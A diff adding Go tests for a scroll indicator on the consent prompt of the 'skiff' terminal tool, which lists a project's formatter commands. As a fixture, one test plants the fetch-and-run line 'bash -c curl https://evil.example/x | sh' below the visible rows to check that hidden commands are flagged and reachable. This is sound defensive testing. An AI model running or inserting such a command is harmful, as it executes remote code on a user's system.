@@ -8,10 +8,12 @@
 package overlay
 
 import (
+	"strings"
 	"testing"
 
 	"github.com/gdamore/tcell/v2"
 
+	"github.com/johnlam90/skiff/internal/scrollbar"
 	"github.com/johnlam90/skiff/internal/theme"
 )
 
@@ -263,6 +265,199 @@ func TestConfirm_DrawsBodyRowsLeftAligned(t *testing.T) {
 		}
 		if got != c.Body[i] {
 			t.Fatalf("body row %d: got %q want %q", i, got, c.Body[i])
+		}
+	}
+}
+
+// -----------------------------------------------------------------------------
+// Body scroll indicator
+// -----------------------------------------------------------------------------
+
+// wideBodyConfirm builds a Body-mode Confirm with n numbered rows on a
+// 100×30 screen, plus the screen to draw it on. Wider than
+// testConfirm's 80 columns deliberately: ConfirmBodyWidth is 84 and
+// Centered does not shrink a frame that outgrows the screen, so on 80
+// columns the frame's right edge — border and indicator alike — falls
+// off the terminal. The indicator tests need a terminal that can show
+// the column they are about.
+func wideBodyConfirm(t *testing.T, n int) (*Confirm, tcell.SimulationScreen) {
+	t.Helper()
+	scr := tcell.NewSimulationScreen("UTF-8")
+	if err := scr.Init(); err != nil {
+		t.Fatalf("init: %v", err)
+	}
+	t.Cleanup(scr.Fini)
+	scr.SetSize(100, 30)
+
+	c := &Confirm{
+		Title: "Trust this project's formatters?",
+		Theme: theme.Default(),
+		Size:  func() (int, int) { return 100, 30 },
+		Body:  make([]string, n),
+	}
+	c.Close = func() {}
+	for i := range n {
+		c.Body[i] = "gofmt -w file" + string(rune('a'+i%26)) + ".go"
+	}
+	return c, scr
+}
+
+// confirmBarColumn draws c and reads its indicator column back across
+// the body rows — the cells a user would actually see.
+func confirmBarColumn(t *testing.T, scr tcell.SimulationScreen, c *Confirm) string {
+	t.Helper()
+	c.Draw(scr)
+	scr.Show()
+	return barCol(scr, c.bar(c.rect()))
+}
+
+// TestConfirm_TrustPromptShowsCommandsExistBelowTheFold is the consent
+// case, and the reason this indicator is a security fix rather than
+// polish. A project's .skiff/format.json can declare more commands than
+// confirmMaxBodyRows shows, and this prompt exists so the user can read
+// the exact argv before allowing any of it to run. With nothing on
+// screen saying the list continues, a hostile repo only has to pad its
+// config until the `bash -c curl … | sh` entry sits past row 14: the
+// prompt looks complete, and the user consents to a command they were
+// never shown. The bar is what makes the hidden rows visible AS hidden.
+func TestConfirm_TrustPromptShowsCommandsExistBelowTheFold(t *testing.T) {
+	c, scr := wideBodyConfirm(t, 30)
+	const payloadRow = 19
+	c.Body[payloadRow] = "bash -c curl https://evil.example/x | sh"
+
+	if c.bodyRows() > payloadRow {
+		t.Fatalf("fixture broken: row %d is on screen, nothing is hidden", payloadRow)
+	}
+	col := confirmBarColumn(t, scr, c)
+	if !strings.ContainsRune(col, scrollbar.Thumb) || !strings.ContainsRune(col, scrollbar.Track) {
+		t.Fatalf("a 30-command consent body must show both thumb and track, got %q", col)
+	}
+	// Track below the thumb is the specific claim "there is more under
+	// this" — a thumb pinned to the bottom would say the opposite.
+	if idx := strings.IndexRune(col, scrollbar.Track); idx <= strings.LastIndex(col, string(scrollbar.Thumb)) {
+		t.Fatalf("at the top of the body the track must continue below the thumb, got %q", col)
+	}
+	// And scrolling really does reach the payload row.
+	c.ScrollBy(payloadRow)
+	if c.Scroll() > payloadRow {
+		t.Fatalf("scroll overshot the payload row: %d", c.Scroll())
+	}
+	c.Draw(scr)
+	scr.Show()
+	r := c.rect()
+	got := ""
+	for x := r.X + 2; x < r.X+2+len(c.Body[payloadRow]); x++ {
+		got += string(cellAt(scr, x, r.Y+4+(payloadRow-c.Scroll())))
+	}
+	if got != c.Body[payloadRow] {
+		t.Fatalf("the hidden command must be reachable, got %q", got)
+	}
+}
+
+// TestConfirm_NoIndicatorWhenBodyFits pins the no-noise half: a body
+// that is fully on screen gets a blank padding column, because a
+// full-height thumb would only add ink without adding information.
+func TestConfirm_NoIndicatorWhenBodyFits(t *testing.T) {
+	c, scr := wideBodyConfirm(t, confirmMaxBodyRows)
+	col := confirmBarColumn(t, scr, c)
+	if strings.ContainsAny(col, string([]rune{scrollbar.Track, scrollbar.Thumb})) {
+		t.Fatalf("a body that fits must draw no bar, got %q", col)
+	}
+}
+
+// TestConfirm_IndicatorThumbFollowsTheScroll pins that the bar reports
+// position and not merely existence: at the top the thumb is at the top
+// of the track, and scrolling to the end pins it to the bottom.
+func TestConfirm_IndicatorThumbFollowsTheScroll(t *testing.T) {
+	c, scr := wideBodyConfirm(t, 30)
+	top := confirmBarColumn(t, scr, c)
+	if !strings.HasPrefix(top, string(scrollbar.Thumb)) {
+		t.Fatalf("at scroll 0 the thumb must start the track, got %q", top)
+	}
+
+	c.ScrollBy(len(c.Body))
+	bottom := confirmBarColumn(t, scr, c)
+	if !strings.HasSuffix(bottom, string(scrollbar.Thumb)) {
+		t.Fatalf("at the end the thumb must finish the track, got %q", bottom)
+	}
+	if top == bottom {
+		t.Fatalf("the thumb must move with the body, stuck at %q", top)
+	}
+
+	wantStart, wantLen, ok := scrollbar.Geom(len(c.Body), c.bodyRows(), c.Scroll())
+	if !ok {
+		t.Fatal("fixture should overflow")
+	}
+	for row, got := range []rune(bottom) {
+		want := scrollbar.Track
+		if row >= wantStart && row < wantStart+wantLen {
+			want = scrollbar.Thumb
+		}
+		if got != want {
+			t.Fatalf("bar row %d: got %q, want %q (col %q)", row, got, want, bottom)
+		}
+	}
+}
+
+// TestConfirm_BarClickJumpsWithoutTouchingTheButtons pins the mouse
+// contract on the new column: a press scrolls the body and nothing
+// else — it must not read as a Yes, a No, or an outside-click cancel,
+// which on a trust prompt would be a click that silently answers the
+// question.
+func TestConfirm_BarClickJumpsWithoutTouchingTheButtons(t *testing.T) {
+	c, scr := wideBodyConfirm(t, 30)
+	var log []string
+	c.Close = func() { log = append(log, "close") }
+	c.OnYes = func() { log = append(log, "yes") }
+	c.OnCancel = func() { log = append(log, "cancel") }
+	confirmBarColumn(t, scr, c)
+
+	b := c.bar(c.rect())
+	c.HandleMouse(b.x, b.top+b.viewH-1, tcell.Button1)
+	if want := len(c.Body) - c.bodyRows(); c.Scroll() != want {
+		t.Fatalf("press at the foot of the bar: scroll %d, want %d", c.Scroll(), want)
+	}
+	if len(log) != 0 {
+		t.Fatalf("a bar press must not answer the prompt, got %v", log)
+	}
+	c.HandleMouse(b.x, b.top, tcell.Button1)
+	if c.Scroll() != 0 {
+		t.Fatalf("press at the head of the bar should return to the top, got %d", c.Scroll())
+	}
+	if len(log) != 0 {
+		t.Fatalf("a bar press must not answer the prompt, got %v", log)
+	}
+}
+
+// TestConfirm_ClassicFormDrawsNoIndicator is the other half of the
+// compatibility pin next to TestConfirm_EmptyBodyKeepsClassicGeometry:
+// the size is unchanged, and so is every cell. len(Body) is zero in the
+// Message form, so the bar is arithmetically impossible there — no
+// scrollbar glyph may appear anywhere on the screen, and the frame's
+// padding column stays blank down its whole height.
+func TestConfirm_ClassicFormDrawsNoIndicator(t *testing.T) {
+	scr := simScreen(t)
+	c, _ := testConfirm()
+	c.Draw(scr)
+	scr.Show()
+
+	r := c.rect()
+	if (r != Rect{X: 13, Y: 7, W: 54, H: 9}) {
+		t.Fatalf("classic geometry drifted: %+v", r)
+	}
+	_, w, h := scr.GetContents()
+	for y := range h {
+		for x := range w {
+			if got := cellAt(scr, x, y); got == scrollbar.Track || got == scrollbar.Thumb {
+				t.Fatalf("classic confirm painted a bar glyph %q at (%d,%d)", got, x, y)
+			}
+		}
+	}
+	// Below the title divider (which spans the full inner width by
+	// design) every content row's padding column stays blank.
+	for y := r.Y + 3; y < r.Y+r.H-1; y++ {
+		if got := cellAt(scr, barColumn(r), y); got != ' ' {
+			t.Fatalf("padding column row %d = %q, want a blank cell", y, got)
 		}
 	}
 }
